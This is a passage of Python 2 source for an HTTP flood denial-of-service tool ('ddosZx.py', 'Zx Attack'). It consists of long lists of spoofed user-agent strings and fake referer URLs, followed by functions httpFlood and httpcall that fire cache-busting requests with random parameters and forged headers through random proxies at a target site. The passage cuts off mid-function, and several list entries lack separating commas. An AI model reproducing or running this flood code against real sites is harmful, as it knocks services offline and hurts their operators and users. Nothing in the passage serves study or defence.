			"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.3.0.0.0",
			"Mozilla/5.0 (SymbianOS 9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344",
			"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344",
			"Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 SonyEricssonP100/01; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525",
			"Mozilla/5.0 (Unknown; U; UNIX BSD/SYSV system; C -) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.2",
			"Mozilla/5.0 (webOS/1.3; U; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/1.0 Safari/525.27.1 Desktop/1.0",
			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
			"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
			"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
			"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
			"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
			"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
			"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
			"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
			"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
			"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
			"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
			"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
			"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
			"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
			"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
			"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
			"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
			"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
			"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
			"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
			"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
			"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
			"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
			"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
			"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
			"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
			"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
			"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
			"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
			"Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
			"Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
			"Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
			"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
			"MSIE (MSIE 6.0; X11; Linux; i686) Opera 7.23",
			"msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
			"msnbot/1.0 ( http://search.msn.com/msnbot.htm)",
			"msnbot/1.1 ( http://search.msn.com/msnbot.htm)",
			"msnbot-media/1.1 ( http://search.msn.com/msnbot.htm)",
			"NetSurf/1.2 (NetBSD; amd64)",
			"Nokia3230/2.0 (5.0614.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0",
			"Nokia6100/1.0 (04.01) Profile/MIDP-1.0 Configuration/CLDC-1.0",
			"Nokia6230/2.0 (04.44) Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Nokia6230i/2.0 (03.80) Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Nokia6630/1.0 (2.39.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0",
			"NokiaN70-1/5.0609.2.0.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
			"NokiaN73-1/3.0649.0.0.1 Series60/3.0 Profile/MIDP2.0 Configuration/CLDC-1.1",
			"nook browser/1.0",
			"Offline Explorer/2.5",
			"Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
			"Opera/7.50 (Windows ME; U) [en]",
			"Opera/7.50 (Windows XP; U)",
			"Opera/7.51 (Windows NT 5.1; U) [en]",
			"Opera/8.01 (J2ME/MIDP; Opera Mini/1.0.1479/HiFi; SonyEricsson P900; no; U; ssr)",
			"Opera/9.0 (Macintosh; PPC Mac OS X; U; en)",
			"Opera/9.20 (Macintosh; Intel Mac OS X; U; en)",
			"Opera/9.25 (Windows NT 6.0; U; en)",
			"Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)",
			"Opera/9.51 Beta (Microsoft Windows; PPC; Opera Mobi/1718; U; en)",
			"Opera/9.5 (Microsoft Windows; PPC; Opera Mobi; U) SonyEricssonX1i/R2AA Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Opera/9.60 (J2ME/MIDP; Opera Mini/4.1.11320/608; U; en) Presto/2.2.0",
			"Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14320/554; U; cs) Presto/2.2.0",
			"Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1",
			"Opera/9.64 (X11; Linux i686; U; Linux Mint; nb) Presto/2.1.1",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/1428; U; en) Presto/2.2.0",
			"Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
			"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
			"Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61",
			"Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00",
			"Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
			"Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
			"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
			"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
			"Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
			"Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
			"P3P Validator",
			"Peach/1.01 (Ubuntu 8.04 LTS; U; en)",
                        "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)"
                        "msnbot/2.0b (+http://search.msn.com/msnbot.htm)"
                        "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
			"POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
			"POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
			"portalmmm/2.0 N410i(c20;TB) ",
			"Python-urllib/2.5",
			"SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
			"SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
			"SearchExpress",
			"SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
			"SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
			"SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
			"SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonT100/R101",
			"SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
			"SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonT68/R201A",
			"SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
			"SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
			"SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"SuperBot/4.4.0.60 (Windows XP)",
			"Uzbl (Webkit 1.3) (Linux i686 [i686])",
			"Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1",
			"W3C_Validator/1.305.2.12 libwww-perl/5.64",
			"W3C_Validator/1.654",
			"w3m/0.5.1",
			"WDG_Validator/1.6.2",
			"WebCopier v4.6",
			"Web Downloader/6.9",
			"WebZIP/3.5 (http://www.spidersoft.com)",
			"Wget/1.9.1",
			"Wget/1.9 cvs-stable (Red Hat modified)",
			"wii libnup/1.0",
			]
	        	        
referers = [
    	"https://www.google.com/search?q=",
	    "https://check-host.net/",
	    "https://www.facebook.com/",
    	"https://www.youtube.com/",
        "https://cyber-hub.pw/"
        "https://www.vedbex.com/tools/home" 
        "https://www.ibm.com/cloud"
        "https://voxility.com/"
        "https://www.redwolfsecurity.com/"
        "https://www.ionos.com/"
        "https://duckduckgo.com/"
        "http://ffm.cloudlayar.xyz/HIT",
        "https://1gb.ru/",
        "https://artplanet.ru/",
        "https://api.freeboot.to/",
        "https://www.react.su/"
        "https://synstresser.to/"
        "https://freeboot.to/"
        "https://dosninja.com/"
        "http://ddos-protection.ru/"
    	"https://www.fbi.com/",
	    "https://www.bing.com/search?q=",
        "https://www.cloudflare.com/",
        "https://www.ovh.ie/",       
        "https://www.hetzner.com/",
        "https://ddos-guard.net/",  
        "https://blazingfast.io/",
        "https://www.rambler.ru/",
        "https://selectel.ru/"
        "https://www.cloudns.net/"
        "http://1.1.1.1/"
        "http://regex.info/exif.cgi?url="
        "https://upcloud.com/"
        "https://www.nhc.noaa.gov/"
        "https://www.youtube.com/"
        "https://www.online.net/"
        "https://www.linode.com/"
        "https://www.datacamp.com/"
        "https://yandex.ru/"
        "https://beget.com/"
        "https://add.my.yahoo.com/rss?url"
        "https://www.hostgator.com/"
        "https://www.bluehost.com"
        "https://play.google.com/store/search?q="
        "https://github.com/"
        "https://www.twitter.com/"
        "https://google.com/"
        "https://www.kaspersky.ru/"
        "https://firstvds.ru"
        "https://www.croc.ru/"
        "https://yandex.kz/"
        "https://www.reg.ru/"
        "https://m.ok.ru/"
        "https://vk.com/"
        "https://www.first-colo.net/"
        "https://cyberwarblog.xyz"
        "https://www.liquidweb.com/"
        "https://www.servereasy.it/"
        "https://twitch.com"
        "https://www.stackpath.com/"
        "https://cloudnode.pw/"
	    "https://r.search.yahoo.com/",
]	
	     
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print '---------------------------------------------------'
	print 'ddosZx.py site'
	print 'Zx Attack'
	print '---------------------------------------------------'

	
#http request
def httpFlood(url):
        useragent_list()
        referer_list()
        keyword_list()
        code=0
        if url.count("?")>0:
                param_joiner="&"
        else:
                param_joiner="?"
        request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
        request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
        request.add_header('Cache-Control', 'no-cache')
        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        #request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
        request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
        #request.add_header('Referer', host)
        request.add_header('Keep-Alive', random.randint(110,120))
        request.add_header('Connection', 'keep-alive')
        request.add_header('Host',host)
        index = random.randint(0,len(listaproxy)-1)
        proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
        urllib2.install_opener(opener)
        try:
                        urllib2.urlopen(request)
                        if(flag==1): set_flag(0)
                        if(code==500): code=0
        except urllib2.HTTPError, e:
                        set_flag(1)
                        print "Http Flood"
                        code=500
        except urllib2.URLError, e:
                        sys.exit()
        else:
                        inc_counter()
                        urllib2.urlopen(request)

def httpcall(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall1(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
